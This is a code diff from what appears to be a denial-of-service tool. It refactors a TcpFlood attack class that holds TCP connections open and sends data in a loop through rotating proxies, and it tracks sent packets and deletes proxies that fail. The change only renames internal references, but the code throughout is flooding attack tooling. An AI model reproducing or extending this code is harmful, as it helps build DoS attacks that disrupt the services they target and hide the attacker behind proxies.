@@ -37,13 +37,13 @@ class TcpFlood(AttackMethod):
 
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as tcp_conn:
-            self._ctx.target.statistic.connect.status_success()
+            self._target.statistic.connect.status_success()
             while self.send(tcp_conn):
                 if self._ctx.dry_run:
                     break
                 continue
 
-            self._ctx.target.statistic.connect.status_failed()
+            self._target.statistic.connect.status_failed()
             self._ctx.sock_manager.close_socket()
 
     def send(self, sock: socket) -> bool:
@@ -55,9 +55,9 @@ class TcpFlood(AttackMethod):
         except ProxyError:
             self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
         except Exception as e:
-            self._ctx.add_error(TcpSendError(message=e))
+            self._target.errors_manager.add_error(TcpSendError(message=e))
         else:
-            self._ctx.target.statistic.packets.status_sent(sent_bytes=sent)
+            self._target.statistic.packets.status_sent(sent_bytes=sent)
             self._proxy.report_success() if self._proxy is not None else 0
             return True
 
